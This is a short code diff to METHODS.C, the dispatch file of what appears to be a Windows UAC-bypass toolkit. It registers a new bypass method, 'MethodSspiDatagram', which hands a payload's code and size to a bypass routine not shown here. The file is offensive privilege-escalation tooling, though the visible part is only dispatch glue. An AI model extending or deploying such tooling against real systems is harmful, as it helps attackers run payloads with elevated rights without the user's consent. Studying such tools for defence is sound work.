@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.64
+*  VERSION:     3.65
 *
-*  DATE:        15 Feb 2023
+*  DATE:        22 Sep 2023
 *
 *  UAC bypass dispatch.
 *
@@ -51,6 +51,7 @@ UCM_API(MethodVFServerTaskSched);
 UCM_API(MethodVFServerDiagProf);
 UCM_API(MethodIscsiCpl);
 UCM_API(MethodAtlHijack);
+UCM_API(MethodSspiDatagram);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWow64Logger,
@@ -146,7 +147,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodVFServerTaskSched, { NT_WIN8_BLUE, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
     { MethodVFServerDiagProf, { NT_WIN7_RTM, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
     { MethodIscsiCpl, { NT_WIN7_RTM, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
-    { MethodAtlHijack, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { MethodAtlHijack, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodSspiDatagram, { NT_WIN7_RTM, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -825,6 +827,13 @@ UCM_API(MethodAtlHijack)
 {
     return ucmAtlHijackMethod(MMC_EXE,
         ATL_DLL,
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+}
+
+UCM_API(MethodSspiDatagram)
+{
+    return ucmSspiDatagramMethod(
         Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
